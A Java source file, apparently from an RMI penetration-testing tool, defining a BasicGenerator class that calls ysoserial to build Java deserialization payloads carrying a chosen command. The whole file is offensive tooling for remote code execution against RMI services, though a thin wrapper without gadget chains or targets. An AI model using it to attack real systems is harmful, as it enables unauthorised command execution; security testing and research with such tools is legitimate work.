package m0.rmitaste.rmi.payload;
import ysoserial.payloads.ObjectPayload;

/**
 * Generates and returns specific payload from ysoserial
 *
 * @author Marcin Ogorzelski (mzero - @_mzer0)
 */
public class BasicGenerator implements PayloadGenerator{

    protected Object currentPayload;
    protected boolean isNext;
    protected String payloadName;
    protected String cmd;

    public BasicGenerator(String payloadName, String cmd){
        this.currentPayload = null;
        this.isNext = true;
        this.payloadName = payloadName;
        this.cmd = cmd;
    }

    public BasicGenerator(){
        this.currentPayload = null;
        this.isNext = true;
        this.payloadName = "";
        this.cmd = "";
    }

    protected void setIsNext(){
        this.isNext = true;
    }

    protected void setNextPayload(){
        return;
    }

    @Override
    public Object getPayload() {
        return this.currentPayload;
    }

    public void generatePayload() {
        if(!this.isNext){
            return;
        }
        this.setNextPayload();
        this.currentPayload = ObjectPayload.Utils.makePayloadObject(this.payloadName, this.cmd);
        this.setIsNext();
    }

    public void generatePayload(String cmd) {
        this.cmd = cmd;
        this.generatePayload();
    }

    public void generatePayload(String payloadName, String cmd) {
        this.payloadName = payloadName;
        this.cmd = cmd;
        this.generatePayload();
    }

    @Override
    public boolean isNextPayload() {
        return this.isNext;
    }

    @Override
    public boolean isEnd() {
        return true;
    }

    @Override
    public void end() {

    }

    @Override
    public String getPayloadName() {
        return this.payloadName;
    }

    @Override
    public String getCmd() {
        return this.cmd;
    }

    @Override
    public void start() {

    }
}
